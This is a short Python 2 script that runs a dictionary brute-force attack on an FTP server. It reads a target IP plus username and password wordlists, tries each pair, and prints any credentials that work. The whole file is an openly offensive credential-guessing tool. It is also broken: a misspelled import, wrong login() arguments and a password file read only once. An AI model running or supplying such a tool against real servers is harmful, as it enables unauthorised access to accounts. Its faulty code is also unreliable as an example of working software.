#!/usr/bin/python
import ftlib
def bruteforcer(host,username,password):
	try:
		ftp = ftplib.FTP(host)
		ftp.login(host,username,password)
		print("Credentials found " + " username is " + username + " password is " + password)
		exit(0)
	except:
		pass

	
	
	
	
	
	
	
	
	
	
tgthost = raw_input("Enter target ip address")
user_dic = raw_input("Enter username dictionary")
pass_dic = raw_input("Enter password dictionary")

file1 = open(user_dic)
file2 = open(pass_dic)
for username in file1.read().splitlines():
	for password in file2.read().splitlines():
		bruteforcer(tgthost,username.rstrip('\n'),password.rstrip('\n'))
		
		
